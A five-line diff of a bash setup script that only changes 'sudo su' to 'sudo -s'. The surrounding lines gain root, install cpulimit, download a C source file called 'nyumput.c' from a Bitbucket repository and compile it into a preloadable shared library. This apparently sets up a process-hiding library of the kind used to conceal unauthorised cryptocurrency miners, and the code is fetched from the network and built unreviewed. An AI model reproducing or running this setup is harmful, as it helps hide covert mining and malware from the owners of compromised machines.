@@ -1,5 +1,5 @@
 #!/bin/bash
-sudo su ; apt-get update ; apt-get install sudo wget cpulimit -y
+sudo -s ; apt-get update ; apt-get install sudo wget cpulimit -y
 curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
 apt-get install build-essential -y
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
